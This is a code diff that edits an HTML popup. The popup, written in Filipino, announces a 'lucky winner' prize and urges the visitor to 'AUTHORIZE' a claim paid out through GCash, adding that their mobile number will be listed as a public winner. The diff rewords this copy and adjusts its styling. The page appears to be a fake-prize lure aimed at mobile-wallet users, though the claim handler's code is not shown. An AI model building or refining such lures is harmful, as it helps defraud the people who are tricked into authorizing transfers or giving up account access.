@@ -81,7 +81,7 @@
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
             
-            <h2>🎉 CONGRATULATIONS! 🎉</h2>
+            <h2 class="congrats-title">🎉 CONGRATULATIONS! 🎉</h2>
             
             <div class="greeting">
                 💎 YOU'RE A LUCKY WINNER! 💎
@@ -95,17 +95,17 @@
             </div>
             
             <div class="message">
-                <p>Ang iyong mga panalo ay handa na para sa iyong eWallet.</p>
+                <p>Ang iyong mga panalo ay handa na para sa iyong pag claim.</p>
                 <p>Sa sandaling iyong <strong class="highlight">AUTHORIZE</strong> ang claim, ang iyong credits ay agad na maililipat.</p>
-                <p>Ang iyong pangalan ay lalabas sa <strong>Live Winners</strong> bilang patunay ng iyong panalo.</p>
+                <p>Ang iyong <strong>mobile number</strong> ay lalabas sa <strong>Live Winners</strong> bilang patunay ng iyong panalo.</p>
             </div>
             
             <div class="simple-note">
-                <p>⚡ Kapag na-Authorize, automatic na mapupunta sa iyong GCash ang premyo ⚡</p>
+                <p>⚡ Kapag na-Authorize, automatic na transfer sa iyong GCash ang inyong premyo ⚡</p>
             </div>
             
             <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">
-                💰 CLAIM THRU GCASH 💰
+                CLAIM THRU GCASH
             </button>
             
             <div class="info-note">
@@ -134,6 +134,19 @@
         #rouletteIcon:hover {
             transform: scale(1.05);
             transition: 0.2s;
+        }
+        
+        /* Adjust title font size para hindi mag-next line */
+        .congrats-title {
+            font-size: 22px !important;
+            white-space: nowrap;
+        }
+        
+        @media (max-width: 480px) {
+            .congrats-title {
+                font-size: 18px !important;
+                white-space: nowrap;
+            }
         }
     </style>
 
